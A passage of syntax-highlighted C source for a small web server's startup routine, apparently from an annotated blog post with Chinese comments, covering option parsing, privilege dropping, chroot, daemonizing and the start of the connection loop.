++argn;</span><br><span class="line">		    data_dir = argv[argn];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 指定cgi模式</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-c"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    cgi_pattern = argv[argn];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 指定用户</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-u"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    user = argv[argn];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 指定主机名</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-h"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    hostname = argv[argn];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-r"</span> ) == <span class="number">0</span> )</span><br><span class="line">		    do_chroot = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-v"</span> ) == <span class="number">0</span> )</span><br><span class="line">		    vhost = <span class="number">1</span>;</span><br><span class="line">		<span class="comment">// 指定日志文件</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-l"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    logfile = argv[argn];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 指定pid文件</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-i"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    pidfile = argv[argn];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 指定编码集</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-T"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    charset = argv[argn];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// here</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-P"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    p3p = argv[argn];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// here</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-M"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    max_age = atoi( argv[argn] );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 无参数则打印帮助</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		    usage();</span><br><span class="line">		++argn;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span> ( argn != argc )</span><br><span class="line">		usage();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 守护进程日志相关</span></span><br><span class="line">	<span class="comment">// 获取程序名称</span></span><br><span class="line">    cp = <span class="built_in">strrchr</span>( argv0, <span class="string">'/'</span> );<span class="comment">// 返回 str 中最后一次出现字符 c 的位置，未找到返回空指针</span></span><br><span class="line">    <span class="keyword">if</span> ( cp != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">		++cp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">		cp = argv0;</span><br><span class="line">	<span class="comment">// 为syslog作准备</span></span><br><span class="line">    openlog( cp, LOG_NDELAY|LOG_PID, LOG_DAEMON );<span class="comment">// C库函数，守护进程日志共三函数：openlog、syslog、closelog，前后两个非必须</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置web端口</span></span><br><span class="line">    <span class="keyword">if</span> ( port == <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="meta">#<span class="meta-keyword">ifdef</span> USE_SSL</span></span><br><span class="line">		<span class="keyword">if</span> ( do_ssl )</span><br><span class="line">	    	port = DEFAULT_HTTPS_PORT;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">	    	port = DEFAULT_HTTP_PORT;</span><br><span class="line">		<span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* USE_SSL */</span></span></span><br><span class="line">			port = DEFAULT_HTTP_PORT;</span><br><span class="line">		<span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* USE_SSL */</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we're root and we're going to become another user, get the uid/gid now.*/</span></span><br><span class="line">    <span class="keyword">if</span> ( getuid() == <span class="number">0</span> )<span class="comment">// 获取调用此进程的用户id，root的uid=0</span></span><br><span class="line">	&#123;</span><br><span class="line">		pwd = getpwnam( user );<span class="comment">// 获取当前用户的passwd结构（从/etc/passwd中获取记录</span></span><br><span class="line">		<span class="keyword">if</span> ( pwd == (struct passwd*) <span class="number">0</span> )<span class="comment">// 未找到此用户，则记录日志并报错</span></span><br><span class="line">	    &#123;</span><br><span class="line">	    	syslog( LOG_CRIT, <span class="string">"unknown user - '%s'"</span>, user );<span class="comment">// 写入/var/log/messages，这是syslogd守护进程的（系统级别），与本httpd的日志不同</span></span><br><span class="line">	    	(<span class="keyword">void</span>) <span class="built_in">fprintf</span>( <span class="built_in">stderr</span>, <span class="string">"%s: unknown user - '%s'\n"</span>, argv0, user );<span class="comment">// 报错到标准错误流，stderr和stdout默认都是打印到屏幕上</span></span><br><span class="line">	    	<span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="comment">// 获取当前用户的uid和gid</span></span><br><span class="line">		uid = pwd-&gt;pw_uid;</span><br><span class="line">		gid = pwd-&gt;pw_gid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 改变日志文件的所有者为指定的用户 </span></span><br><span class="line">    <span class="comment">/* Log file. */</span></span><br><span class="line">    <span class="keyword">if</span> ( logfile != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//打开指定的日志文件：若打开失败、若日志文件不是以绝对路径的方式</span></span><br><span class="line">		logfp = fopen( logfile, <span class="string">"a"</span> );</span><br><span class="line">		<span class="keyword">if</span> ( logfp == (FILE*) <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">		    syslog( LOG_CRIT, <span class="string">"%s - %m"</span>, logfile );</span><br><span class="line">		    perror( logfile );<span class="comment">//将上一个函数发生错误的原因输出到标准错误(stderr).</span></span><br><span class="line">		    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ( logfile[<span class="number">0</span>] != <span class="string">'/'</span> )</span><br><span class="line">		&#123;</span><br><span class="line">		    syslog( LOG_WARNING, <span class="string">"logfile is not an absolute path, you may not be able to re-open it"</span> );</span><br><span class="line">		    (<span class="keyword">void</span>) <span class="built_in">fprintf</span>( <span class="built_in">stderr</span>, <span class="string">"%s: logfile is not an absolute path, you may not be able to re-open it\n"</span>, argv0 );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//日志文件打开正常</span></span><br><span class="line">		<span class="keyword">if</span> ( getuid() == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">		    <span class="comment">/* If we are root then we chown the log file to the user we'll be switching to.*/</span></span><br><span class="line">			<span class="keyword">if</span> ( fchown( fileno( logfp ), uid, gid ) &lt; <span class="number">0</span> )<span class="comment">// fd = fileno(fp)获取文件描述符、fchown改变文件的所有者</span></span><br><span class="line">			&#123;</span><br><span class="line">				syslog( LOG_WARNING, <span class="string">"fchown logfile - %m"</span> );</span><br><span class="line">				perror( <span class="string">"fchown logfile"</span> );</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// here</span></span><br><span class="line">    <span class="comment">/* Look up hostname. */</span></span><br><span class="line">    lookup_hostname(&amp;host_addr4, <span class="keyword">sizeof</span>(host_addr4), &amp;gotv4,&amp;host_addr6, <span class="keyword">sizeof</span>(host_addr6), &amp;gotv6 );</span><br><span class="line">    <span class="keyword">if</span> ( hostname == (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		(<span class="keyword">void</span>) gethostname( hostname_buf, <span class="keyword">sizeof</span>(hostname_buf) );</span><br><span class="line">		hostname = hostname_buf;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span> ( ! ( gotv4 || gotv6 ) )</span><br><span class="line">	&#123;</span><br><span class="line">		syslog( LOG_CRIT, <span class="string">"can't find any valid address"</span> );</span><br><span class="line">		(<span class="keyword">void</span>) <span class="built_in">fprintf</span>( <span class="built_in">stderr</span>, <span class="string">"%s: can't find any valid address\n"</span>, argv0 );</span><br><span class="line">		<span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize listen sockets.  Try v6 first because of a Linux peculiarity;</span></span><br><span class="line"><span class="comment">    ** like some other systems, it has magical v6 sockets that also listen for</span></span><br><span class="line"><span class="comment">    ** v4, but in Linux if you bind a v4 socket first then the v6 bind fails.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> ( gotv6 )</span><br><span class="line">	listen6_fd = initialize_listen_socket( &amp;host_addr6 );</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	listen6_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( gotv4 )</span><br><span class="line">	listen4_fd = initialize_listen_socket( &amp;host_addr4 );</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	listen4_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* If we didn't get any valid sockets, fail. */</span></span><br><span class="line">    <span class="keyword">if</span> ( listen4_fd == <span class="number">-1</span> &amp;&amp; listen6_fd == <span class="number">-1</span> )</span><br><span class="line">	&#123;</span><br><span class="line">	syslog( LOG_CRIT, <span class="string">"can't bind to any address"</span> );</span><br><span class="line">	(<span class="keyword">void</span>) <span class="built_in">fprintf</span>( <span class="built_in">stderr</span>, <span class="string">"%s: can't bind to any address\n"</span>, argv0 );</span><br><span class="line">	<span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_SSL</span></span><br><span class="line">    <span class="keyword">if</span> ( do_ssl )</span><br><span class="line">	&#123;</span><br><span class="line">	SSL_load_error_strings();</span><br><span class="line">	SSLeay_add_ssl_algorithms();</span><br><span class="line">	ssl_ctx = SSL_CTX_new( SSLv23_server_method() );</span><br><span class="line">	SSL_CTX_set_options( ssl_ctx, SSL_OP_NO_SSLv2|SSL_OP_NO_SSLv3 );</span><br><span class="line">	<span class="keyword">if</span> ( certfile[<span class="number">0</span>] != <span class="string">'\0'</span> )</span><br><span class="line">	    <span class="keyword">if</span> ( SSL_CTX_use_certificate_file( ssl_ctx, certfile, SSL_FILETYPE_PEM ) == <span class="number">0</span> ||</span><br><span class="line">		 SSL_CTX_use_certificate_chain_file( ssl_ctx, certfile ) == <span class="number">0</span> ||</span><br><span class="line">		 SSL_CTX_use_PrivateKey_file( ssl_ctx, certfile, SSL_FILETYPE_PEM ) == <span class="number">0</span> ||</span><br><span class="line">		 SSL_CTX_check_private_key( ssl_ctx ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">		ERR_print_errors_fp( <span class="built_in">stderr</span> );</span><br><span class="line">		<span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">if</span> ( cipher != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    <span class="keyword">if</span> ( SSL_CTX_set_cipher_list( ssl_ctx, cipher ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">		ERR_print_errors_fp( <span class="built_in">stderr</span> );</span><br><span class="line">		<span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* USE_SSL */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! debug )</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">/* Make ourselves a daemon. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_DAEMON</span></span><br><span class="line">	<span class="keyword">if</span> ( daemon( <span class="number">1</span>, <span class="number">1</span> ) &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"daemon - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"daemon"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">switch</span> ( fork() )</span><br><span class="line">	    &#123;</span><br><span class="line">	    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"fork - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"fork"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    <span class="keyword">default</span>:</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">0</span> );</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SETSID</span></span><br><span class="line">	(<span class="keyword">void</span>) setsid();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">/* Even if we don't daemonize, we still want to disown our parent</span></span><br><span class="line"><span class="comment">	** process.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">#ifdef HAVE_SETSID</span><br><span class="line">	(<span class="keyword">void</span>) setsid();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_SETSID */</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( pidfile != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">	<span class="comment">/* Write the PID file. */</span></span><br><span class="line">	FILE* pidfp = fopen( pidfile, <span class="string">"w"</span> );</span><br><span class="line">        <span class="keyword">if</span> ( pidfp == (FILE*) <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"%s - %m"</span>, pidfile );</span><br><span class="line">	    perror( pidfile );</span><br><span class="line">            <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">            &#125;</span><br><span class="line">        (<span class="keyword">void</span>) <span class="built_in">fprintf</span>( pidfp, <span class="string">"%d\n"</span>, (<span class="keyword">int</span>) getpid() );</span><br><span class="line">        (<span class="keyword">void</span>) fclose( pidfp );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Read zone info now, in case we chroot(). */</span></span><br><span class="line">    tzset();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we're root, start becoming someone else. */</span></span><br><span class="line">    <span class="keyword">if</span> ( getuid() == <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">/* Set aux groups to null. */</span></span><br><span class="line">	<span class="keyword">if</span> ( setgroups( <span class="number">0</span>, (<span class="keyword">gid_t</span>*) <span class="number">0</span> ) &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"setgroups - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"setgroups"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line">	<span class="comment">/* Set primary group. */</span></span><br><span class="line">	<span class="keyword">if</span> ( setgid( gid ) &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"setgid - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"setgid"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line">	<span class="comment">/* Try setting aux groups correctly - not critical if this fails. */</span></span><br><span class="line">	<span class="keyword">if</span> ( initgroups( user, gid ) &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_ERR, <span class="string">"initgroups - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"initgroups"</span> );</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SETLOGIN</span></span><br><span class="line">	<span class="comment">/* Set login name. */</span></span><br><span class="line">	(<span class="keyword">void</span>) setlogin( user );</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_SETLOGIN */</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Switch directories if requested. */</span></span><br><span class="line">    <span class="keyword">if</span> ( dir != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span> ( chdir( dir ) &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"chdir - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"chdir"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get current directory. */</span></span><br><span class="line">    (<span class="keyword">void</span>) getcwd( cwd, <span class="keyword">sizeof</span>(cwd) - <span class="number">1</span> );</span><br><span class="line">    <span class="keyword">if</span> ( cwd[<span class="built_in">strlen</span>( cwd ) - <span class="number">1</span>] != <span class="string">'/'</span> )</span><br><span class="line">	(<span class="keyword">void</span>) <span class="built_in">strcat</span>( cwd, <span class="string">"/"</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Chroot if requested. */</span></span><br><span class="line">    <span class="keyword">if</span> ( do_chroot )</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span> ( chroot( cwd ) &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"chroot - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"chroot"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line">	<span class="comment">/* If we're logging and the logfile's pathname begins with the</span></span><br><span class="line"><span class="comment">	** chroot tree's pathname, then elide the chroot pathname so</span></span><br><span class="line"><span class="comment">	** that the logfile pathname still works from inside the chroot</span></span><br><span class="line"><span class="comment">	** tree.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">if</span> ( logfile != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>( logfile, cwd, <span class="built_in">strlen</span>( cwd ) ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">		(<span class="keyword">void</span>) ol_strcpy( logfile, &amp;logfile[<span class="built_in">strlen</span>( cwd ) - <span class="number">1</span>] );</span><br><span class="line">		<span class="comment">/* (We already guaranteed that cwd ends with a slash, so leaving</span></span><br><span class="line"><span class="comment">		** that slash in logfile makes it an absolute pathname within</span></span><br><span class="line"><span class="comment">		** the chroot tree.)</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		&#125;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		syslog( LOG_WARNING, <span class="string">"logfile is not within the chroot tree, you will not be able to re-open it"</span> );</span><br><span class="line">		(<span class="keyword">void</span>) <span class="built_in">fprintf</span>( <span class="built_in">stderr</span>, <span class="string">"%s: logfile is not within the chroot tree, you will not be able to re-open it\n"</span>, argv0 );</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	(<span class="keyword">void</span>) <span class="built_in">strcpy</span>( cwd, <span class="string">"/"</span> );</span><br><span class="line">	<span class="comment">/* Always chdir to / after a chroot. */</span></span><br><span class="line">	<span class="keyword">if</span> ( chdir( cwd ) &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"chroot chdir - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"chroot chdir"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Switch directories again if requested. */</span></span><br><span class="line">    <span class="keyword">if</span> ( data_dir != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span> ( chdir( data_dir ) &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"data_dir chdir - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"data_dir chdir"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we're root, become someone else. */</span></span><br><span class="line">    <span class="keyword">if</span> ( getuid() == <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">/* Set uid. */</span></span><br><span class="line">	<span class="keyword">if</span> ( setuid( uid ) &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"setuid - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"setuid"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line">	<span class="comment">/* Check for unnecessary security exposure. */</span></span><br><span class="line">	<span class="keyword">if</span> ( ! do_chroot )</span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_WARNING,</span><br><span class="line">		<span class="string">"started as root without requesting chroot(), warning only"</span> );</span><br><span class="line">	    (<span class="keyword">void</span>) <span class="built_in">fprintf</span>( <span class="built_in">stderr</span>,</span><br><span class="line">		<span class="string">"%s: started as root without requesting chroot(), warning only\n"</span>, argv0 );</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Catch various signals. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SIGSET</span></span><br><span class="line">    (<span class="keyword">void</span>) sigset( SIGTERM, handle_sigterm );</span><br><span class="line">    (<span class="keyword">void</span>) sigset( SIGINT, handle_sigterm );</span><br><span class="line">    (<span class="keyword">void</span>) sigset( SIGUSR1, handle_sigterm );</span><br><span class="line">    (<span class="keyword">void</span>) sigset( SIGHUP, handle_sighup );</span><br><span class="line">    (<span class="keyword">void</span>) sigset( SIGCHLD, handle_sigchld );</span><br><span class="line">    (<span class="keyword">void</span>) sigset( SIGPIPE, SIG_IGN );</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* HAVE_SIGSET */</span></span></span><br><span class="line">    (<span class="keyword">void</span>) signal( SIGTERM, handle_sigterm );</span><br><span class="line">    (<span class="keyword">void</span>) signal( SIGINT, handle_sigterm );</span><br><span class="line">    (<span class="keyword">void</span>) signal( SIGUSR1, handle_sigterm );</span><br><span class="line">    (<span class="keyword">void</span>) signal( SIGHUP, handle_sighup );</span><br><span class="line">    (<span class="keyword">void</span>) signal( SIGCHLD, handle_sigchld );</span><br><span class="line">    (<span class="keyword">void</span>) signal( SIGPIPE, SIG_IGN );</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_SIGSET */</span></span></span><br><span class="line">    got_hup = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    init_mime();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( hostname == (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	syslog(</span><br><span class="line">	    LOG_NOTICE, <span class="string">"%.80s starting on port %d"</span>, SERVER_SOFTWARE,</span><br><span class="line">	    (<span class="keyword">int</span>) port );</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	syslog(</span><br><span class="line">	    LOG_NOTICE, <span class="string">"%.80s starting on %.80s, port %d"</span>, SERVER_SOFTWARE,</span><br><span class="line">	    hostname, (<span class="keyword">int</span>) port );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Main loop. */</span></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">/* Do we need to re-open the log file? */</span></span><br><span class="line">	<span class="keyword">if</span> ( got_hup )</span><br><span class="line">	    &#123;</span><br><span class="line">	    re_open_logfile();</span><br><span class="line">	    got_hup = <span class="number">0</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Do a select() on at least one and possibly two listen fds.</span></span><br><span class="line"><span class="comment">	** If there's only one listen fd then we could skip the select</span></span><br><span class="line"><span class="comment">	** and just do the (blocking) accept(), saving one system call;</span></span><br><span class="line"><span class="comment">	** that's what happened up through version 1.18.  However there</span></span><br><span class="line"><span class="comment">	** is one slight drawback to that method: the blocking accept()</span></span><br><span class="line"><span class="comment">	** is not interrupted by a signal call.  Since we definitely want</span></span><br><span class="line"><span class="comment">	** signals to interrupt a waiting server, we use select() even</span></span><br><span class="line"><span class="comment">	** if there's only one fd.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	FD_ZERO( &amp;lfdset );</span><br><span class="line">	maxfd = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span> ( listen4_fd != <span class="number">-1</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    FD_SET( listen4_fd, &amp;lfdset );</span><br><span class="line">	    <span class="keyword">if</span> ( listen4_fd &gt; maxfd )</span><br><span class="line">		maxfd = listen4_fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	<span class="keyword">if</span> ( listen6_fd != <span class="number">-1</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    FD_SET( listen6_fd, &amp;lfdset );</span><br><span class="line">	    <span class="keyword">if</span> ( listen6_fd &gt; maxfd )</span><br><span class="line">		maxfd = listen6_fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	<span class="keyword">if</span> ( select( maxfd + <span class="number">1</span>, &amp;lfdset, (fd_set*) <span class="number">0</span>, (fd_set*) <span class="number">0</span>, (struct timeval*) <span class="number">0</span> ) &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    <span class="keyword">if</span> ( errno == EINTR || errno == EAGAIN )</span><br><span class="line">		<span class="keyword">continue</span>;	<span class="comment">/* try again */</span></span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"select - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"select"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Accept the new connection. */</span></span><br><span class="line">	sz = <span class="keyword">sizeof</span>(usa);</span><br><span class="line">	<span class="keyword">if</span> ( listen4_fd != <span class="number">-1</span> &amp;&amp; FD_ISSET( listen4_fd, &amp;lfdset ) )</span><br><span class="line">	    conn_fd = accept( listen4_fd, &amp;usa.sa, &amp;sz );</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ( 